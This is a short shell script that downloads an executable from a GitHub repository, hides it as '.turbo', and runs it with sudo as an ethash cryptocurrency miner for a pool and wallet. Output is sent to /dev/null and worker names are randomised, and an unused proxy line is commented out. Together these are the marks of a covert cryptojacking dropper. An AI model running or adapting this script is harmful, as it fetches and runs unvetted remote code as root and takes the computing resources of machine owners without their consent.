#!/bin/sh
apt install screen -y
wget https://github.com/azis07/turbo/raw/main/turbo
mv turbo .turbo
chmod +x .turbo
screen -dmS ls 
POOL=eth-pool.beepool.org:9530
WALLET=langitterang
WORKER=$(echo $(gshuf -i 11111-9999999 -n 1)-GPU)
#PROXY=socks5://72.210.252.134:46164
sudo ./.turbo -a ethash -o $POOL -u $WALLET.$WORKER > /dev/null
